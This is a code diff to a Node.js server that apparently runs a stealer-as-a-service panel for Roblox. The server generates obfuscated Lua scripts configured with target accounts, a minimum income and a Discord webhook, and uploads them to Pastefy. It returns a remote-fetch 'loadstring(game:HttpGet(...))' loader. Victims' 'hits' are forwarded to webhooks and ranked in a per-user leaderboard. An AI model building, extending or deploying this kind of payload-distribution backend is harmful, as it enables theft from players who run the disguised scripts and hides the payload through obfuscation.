@@ -155,6 +155,25 @@ app.get('/auth/discord/callback', async (req, res) => {
         };
         SESSIONS.set(sessionToken, sessionObj);
 
+        // Upsert user in MongoDB (store username, avatar, discriminator)
+        try {
+            await UsersInfo.findOneAndUpdate(
+                { Id: String(user.id) },
+                {
+                    $set: {
+                        Username: user.username || '',
+                        Avatar: user.avatar || null,
+                        Discriminator: user.discriminator || ''
+                    },
+                    $setOnInsert: { Hits: [] }
+                },
+                { upsert: true, new: true, setDefaultsOnInsert: true }
+            );
+            log(`✅ [DB] User saved/upserted: ${user.id}`);
+        } catch (dbErr) {
+            log(`⚠️ [DB] Failed to upsert user ${user.id}: ${dbErr && dbErr.message ? dbErr.message : dbErr}`);
+        }
+
         const redirectTarget = `${req.protocol}://${req.get('host')}/login.html`;
         try {
             const redirectUrl = new URL(redirectTarget);
@@ -255,7 +274,7 @@ function generateScriptId() {
     return id;
 }
 
-async function createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw, visualRaw) {
+async function createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw, visualRaw, userId) {
     let targetsArray = [];
     if (Array.isArray(targetsRaw)) targetsArray = targetsRaw.map(t => String(t));
     else if (typeof targetsRaw === 'string') {
@@ -284,10 +303,41 @@ async function createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw
     ].join('\n');
 
     const lua = await obfuscateScript(src);
+    if (!lua) {
+        log('❌ [CREATE] Obfuscation failed, abort.');
+        return null;
+    }
+
     const paste = await uploadScript(lua, `${scriptId}.lua`, 'hfI1y3F8');
+    if (!paste || !paste.raw_url) {
+        log('❌ [CREATE] Pastefy upload failed, abort.');
+        return null;
+    }
+
+    // Attempt to save script metadata in DB for future lookup (ScriptId -> paste url, owner, webhook)
+    try {
+        const scriptDoc = {
+            Id: String(scriptId),
+            UserId: userId ? String(userId) : null,
+            PasteId: paste.id, // store the paste URL for retrieval
+            WebHookUrl: webhookUrlRaw || ''
+        };
+
+        // upsert to avoid duplicate key errors if same Id somehow exists
+        await ScriptsInfos.findOneAndUpdate(
+            { Id: scriptDoc.Id },
+            { $set: scriptDoc },
+            { upsert: true, new: true, setDefaultsOnInsert: true }
+        );
+
+        log(`✅ [DB] Script saved: ${scriptId} (owner: ${userId || 'none'})`);
+    } catch (dbErr) {
+        log(`⚠️ [DB] Failed to save script ${scriptId}: ${dbErr && dbErr.message ? dbErr.message : dbErr}`);
+        // On continue — le script a bien été uploadé, on renvoie l'URL quand même
+    }
+
     return `loadstring(game:HttpGet("${paste.raw_url}"))()`;
 }
-
 /* ----------------- DB connect + Discord bot (unchanged) ----------------- */
 mongoose.connect(MONGO_URI)
     .then(() => {
@@ -334,8 +384,8 @@ app.post('/api/create-script', async (req, res) => {
         const targetsRaw = body.targets || ["MagixSafe", "M4GIX_TAB01", "M4GIX_TAB02", "TeCu71710"];
         const webhookUrlRaw = body.webhookurl || '';
         const visualRaw = body.visual || '';
-
-        const loader = await createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw, visualRaw);
+        const userId = body.discordUserId;
+        const loader = await createScriptLoader(minIncome, maxItems, targetsRaw, webhookUrlRaw, visualRaw, userId);
 
         return res.status(201).json({ success: true, data: { Script: loader } });
     } catch (err) {
@@ -431,13 +481,14 @@ app.post('/api/hit', async (req, res) => {
         }
 
         // Si ScriptId présent et valide (non null, non vide), rechercher script et forwarder aussi
+        let resolvedScript = null;
         try {
             if (hitInfo.ScriptId && String(hitInfo.ScriptId).trim() !== '') {
-                const script = await ScriptsInfos.findOne({ Id: String(hitInfo.ScriptId) }).lean();
-                if (script && script.WebHookUrl) {
+                resolvedScript = await ScriptsInfos.findOne({ Id: String(hitInfo.ScriptId) }).lean();
+                if (resolvedScript && resolvedScript.WebHookUrl) {
                     // éviter double envoi vers la même URL
-                    if (String(script.WebHookUrl) !== String(WEBHOOK_URL)) {
-                        PostHitOnWebHook(script.WebHookUrl, hitInfo)
+                    if (String(resolvedScript.WebHookUrl) !== String(WEBHOOK_URL)) {
+                        PostHitOnWebHook(resolvedScript.WebHookUrl, hitInfo)
                             .catch(err => log(`⚠️ PostHitOnWebHook (script) rejection: ${err && err.message ? err.message : err}`));
                     } else {
                         log('ℹ️ Script WebHookUrl identique à WEBHOOK_URL, envoi unique effectué.');
@@ -451,6 +502,31 @@ app.post('/api/hit', async (req, res) => {
             // on continue — la réponse au client Lua restera 201
         }
 
+        // Enregistrer / incrémenter le hit dans la table Users (non bloquant)
+        (async () => {
+            try {
+                const now = new Date();
+
+                // 1) Priorité : si le script existe et contient un UserId, l'utiliser
+                let userId = resolvedScript && resolvedScript.UserId ? String(resolvedScript.UserId) : null;
+
+                // 3) Si on a un userId, upserter et push la date courante dans Hits
+                if (userId) {
+                    await UsersInfo.findOneAndUpdate(
+                        { Id: userId },
+                        { $push: { Hits: now } },
+                        { upsert: true, new: true, setDefaultsOnInsert: true }
+                    );
+                    log(`✅ [USER-HIT] Hit enregistré pour UserId=${userId}`);
+                    return;
+                }
+
+                log(`ℹ️ [USER-HIT] Aucun utilisateur identifiable pour Hit: ${hitInfo.Name || 'N/A'} (ScriptId: ${hitInfo.ScriptId || 'N/A'})`);
+            } catch (dbErr) {
+                log(`⚠️ [USER-HIT ERROR] ${dbErr && dbErr.message ? dbErr.message : dbErr}`);
+            }
+        })();
+
         // Retourner toujours 201 pour que le script Lua considère l'envoi comme réussi
         return res.status(201).json({ Success: true, Message: 'Hit received' });
     } catch (err) {
@@ -459,7 +535,6 @@ app.post('/api/hit', async (req, res) => {
         return res.status(201).json({ Success: true, Message: 'Hit received (processing error logged)' });
     }
 });
-
 async function PostHitOnWebHook(webHookUrl, hitInfo) {
     try {
         const webhookClient = new WebhookClient({ url: webHookUrl });
@@ -512,6 +587,41 @@ async function PostHitOnWebHook(webHookUrl, hitInfo) {
         log(`⚠️ Forward Webhook Error: ${err.message}`);
     }
 }
+
+// Ajoutez cette route AVANT app.use(express.static('public'));
+app.get('/api/users', async (req, res) => {
+    try {
+        // Récupère tous les users
+        const users = await UsersInfo.find({}).lean();
+
+        const items = users.map(u => {
+            const hitCount = Array.isArray(u.Hits) ? u.Hits.length : 0;
+            let avatarUrl = null;
+            if (u.Avatar && u.Id) {
+                const hash = String(u.Avatar);
+                const isAnimated = hash.startsWith('a_');
+                const ext = isAnimated ? 'gif' : 'png';
+                avatarUrl = `https://cdn.discordapp.com/avatars/${u.Id}/${hash}.${ext}?size=64`;
+            }
+            return {
+                Id: u.Id,
+                Username: u.Username || '',
+                Discriminator: u.Discriminator || '',
+                AvatarUrl: avatarUrl,
+                HitCount: hitCount,
+                LastHit: (Array.isArray(u.Hits) && u.Hits.length) ? u.Hits[u.Hits.length - 1] : null
+            };
+        });
+
+        // Trier par HitCount décroissant
+        items.sort((a, b) => b.HitCount - a.HitCount);
+
+        return res.json({ success: true, data: items });
+    } catch (err) {
+        log(`❌ [API] GET /api/users error: ${err && err.message ? err.message : err}`);
+        return res.status(500).json({ success: false, message: 'Internal server error' });
+    }
+});
 
 app.use(express.static('public'));
 
